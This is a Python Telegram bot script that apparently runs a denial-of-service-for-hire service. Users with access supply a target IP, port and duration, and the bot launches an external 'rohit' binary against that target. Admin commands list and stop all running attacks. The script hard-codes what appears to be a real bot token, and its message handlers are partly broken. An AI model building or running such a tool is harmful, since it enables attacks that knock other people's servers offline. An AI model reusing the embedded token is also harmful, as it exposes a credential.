import hashlib
import subprocess
import sys
import os
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext, MessageHandler, Filters

# Path to the hash file where 'rohit' binary's hash is stored
hash_file_path = "rohit_hash.txt"

# Define the expected binary file name
EXPECTED_BINARY_NAME = "rohit"

# Global variable to keep track of running attacks
running_attacks = {}

# Define the admin user ID (replace with your actual admin ID)
ADMIN_ID = 6122569362 # Example: replace with your Telegram user ID

# Function to calculate SHA-256 hash of a file
def calculate_hash(file_path):
    sha256_hash = hashlib.sha256()
    with open(file_path, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()

# Function to verify the binary file's integrity (check hash)
def verify_binary_integrity(binary_path):
    if not os.path.exists(binary_path):
        print(f"Error: Binary file '{binary_path}' not found.")
        return False
    
    # Calculate the hash of the binary file
    actual_hash = calculate_hash(binary_path)
    
    # Read the expected hash from the file
    try:
        with open(hash_file_path, "r") as hash_file:
            expected_hash = hash_file.read().strip()
    except FileNotFoundError:
        print(f"Error: Hash file '{hash_file_path}' not found.")
        return False
    
    # Compare the hashes
    if actual_hash != expected_hash:
        print(f"Error: Binary integrity check failed. The binary file has been modified.")
        return False  # Abort if hashes don't match
    return True

# Function to execute the "rohit" binary
def execute_binary(ip, port, duration):
    binary_path = "rohit"  # Expected file name is "rohit"
    
    # First, check if the binary name and its integrity are valid
    if not verify_binary_integrity(binary_path):
        return "Binary integrity check failed."
    
    # If the binary name and integrity are correct, execute it
    process = subprocess.Popen([binary_path, ip, port, duration, '100'])
    return process

# Command handler for the '/start' command
def start(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    
    # Example of checking if the user has valid access to use the bot
    if user_id in users_access and users_access[user_id]['valid']:
        update.message.reply_text(
            "Welcome! Here are your commands:\n"
            "/attack - Start an attack\n"
            "/stop_attack - Stop the attack\n"
            "/my_plan - Check your plan status"
        )
    else:
        update.message.reply_text("You don't have valid access to use this bot.")

# Command handler for the '/attack' command
def attack(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    
    if user_id in users_access and users_access[user_id]['valid']:
        update.message.reply_text("Please enter the IP address of the target:")
        return
    
    else:
        update.message.reply_text("You do not have valid access to perform this action.")

# Handle the user's reply to the IP address
def handle_ip_reply(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in users_access or not users_access[user_id]['valid']:
        return

    ip = update.message.text
    context.user_data['ip'] = ip
    update.message.reply_text(f"Received IP: {ip}\nPlease enter the port number:")

# Handle the user's reply to the port number
def handle_port_reply(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in users_access or not users_access[user_id]['valid']:
        return
    
    port = update.message.text
    context.user_data['port'] = port
    update.message.reply_text(f"Received port: {port}\nPlease enter the attack duration (in seconds):")

# Handle the user's reply to the duration
def handle_duration_reply(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in users_access or not users_access[user_id]['valid']:
        return

    duration = update.message.text
    context.user_data['duration'] = duration
    ip = context.user_data['ip']
    port = context.user_data['port']
    duration = context.user_data['duration']

    update.message.reply_text(f"Attack starting on {ip}:{port} for {duration} seconds...")
    
    # Execute the attack (running the rohit binary)
    process = execute_binary(ip, port, duration)
    
    if process:
        # Store the process in the running_attacks dictionary
        running_attacks[user_id] = process
        update.message.reply_text(f"Attack successfully started on {ip}:{port} for {duration} seconds.")
    else:
        update.message.reply_text("Failed to start the attack.")

# Command handler for the '/stop_attack' command
def stop_attack(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id in running_attacks:
        # Terminate the running attack process
        process = running_attacks[user_id]
        process.terminate()
        del running_attacks[user_id]  # Remove from the running attacks list
        update.message.reply_text("Attack has been stopped.")
    else:
        update.message.reply_text("No attack is currently running.")

# Command handler for the '/admin' command (exclusive to the admin user)
def admin(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id == ADMIN_ID:
        update.message.reply_text("You are the admin. Here are the available commands:\n"
                                  "/list_attacks - List all ongoing attacks\n"
                                  "/stop_all_attacks - Stop all ongoing attacks")
    else:
        update.message.reply_text("You don't have admin privileges.")

# Command to list all ongoing attacks
def list_attacks(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id == ADMIN_ID:
        if running_attacks:
            attacks_info = "\n".join([f"User {uid}: {proc.args[1]}:{proc.args[2]} for {proc.args[3]} seconds"
                                      for uid, proc in running_attacks.items()])
            update.message.reply_text(f"Ongoing attacks:\n{attacks_info}")
        else:
            update.message.reply_text("No ongoing attacks.")
    else:
        update.message.reply_text("You don't have admin privileges.")

# Command to stop all ongoing attacks
def stop_all_attacks(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id == ADMIN_ID:
        for user_id, proc in running_attacks.items():
            proc.terminate()
        running_attacks.clear()
        update.message.reply_text("All ongoing attacks have been stopped.")
    else:
        update.message.reply_text("You don't have admin privileges.")

# Dictionary for user access control (user_id -> access validity)
users_access = {
    12345: {'valid': True},   # Example: User with ID 12345 has access
    67890: {'valid': False},  # Example: User with ID 67890 does not have access
}

def main():
    # Initialize the Telegram bot with your token
    token = "7776000937:AAHKMHSG3ufl65CUuVQ4ioxGijx1hBj9tqA"
    updater = Updater(token)

    # Add command handlers
    updater.dispatcher.add_handler(CommandHandler("start", start))
    updater.dispatcher.add_handler(CommandHandler("attack", attack))
    updater.dispatcher.add_handler(CommandHandler("stop_attack", stop_attack))
    updater.dispatcher.add_handler(CommandHandler("admin", admin))
    updater.dispatcher.add_handler(CommandHandler("list_attacks", list_attacks))
    updater.dispatcher.add_handler(CommandHandler("stop_all_attacks", stop_all_attacks))

    # Add message handlers for IP, port, and duration
    updater.dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_ip_reply))
    updater.dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_port_reply))
    updater.dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_duration_reply))

    # Start polling
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
